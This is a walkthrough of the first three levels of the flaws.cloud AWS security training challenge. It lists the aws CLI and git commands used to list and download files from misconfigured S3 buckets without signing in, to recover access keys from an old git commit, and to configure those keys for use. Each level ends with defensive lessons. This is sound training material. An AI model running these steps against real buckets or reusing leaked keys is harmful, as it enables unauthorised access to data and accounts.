## Notes on Flaws.cloud

### Website: [Flaws.Cloud](http://flaws.cloud/)

#### Level 1

- **Description**: This level promises an enjoyable challenge. Your task is to locate the first sub-domain.
  
- **Hints**: 
  - Visit [Hint 1](http://flaws.cloud/hint1.html)
  - Additional hint available at [Hint 2](http://flaws.cloud/hint2.html)
  
- **Commands Used**:
  ```
  nslookup flaws.cloud
  nslookup flaws.cloud.s3.amazonaws.com
  aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
  aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request --region us-west-2
  ```

- **Summary of Findings**: 
  - Discovered loose permissions facilitating access to files and directories.
  - Extracted a secret file revealing further insights.

#### Level 2

- **Description**: The next level resembles the previous one, albeit with a twist. Access to your own AWS account (free tier) is required.

- **Hints**: 
  - Refer to [Hint 1](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html)

- **Commands Used**:
  ```
  aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
  ```

- **Summary of Findings**:
  - Highlighted the importance of securing S3 bucket permissions for public websites.
  - Demonstrated the consequences of granting excessive access.

#### Level 3

- **Description**: Similar to the previous levels, yet with a slight deviation. Your objective now is to discover your first AWS key.

- **Hints**:
  - See [Hint 1](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html)

- **Commands Used**:
  ```
  aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --region us-west-2
  aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
  git log
  git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
  ls
  cat access_keys.txt
  aws configure --profile flaws
  aws --profile flaws s3 ls
  ```

- **Summary of Findings**:
  - Uncovered sensitive information, including AWS access keys.
  - Demonstrated the importance of securing keys and revoking compromised access.

### Lessons Learned:

- **Level 1**: Be cautious of loose permissions on S3 buckets, which may inadvertently expose sensitive data.
- **Level 2**: Properly manage access permissions for S3 buckets hosting public websites to prevent unauthorized access.
- **Level 3**: Always revoke compromised or leaked keys promptly. Limit access to only necessary resources to minimize security risks.
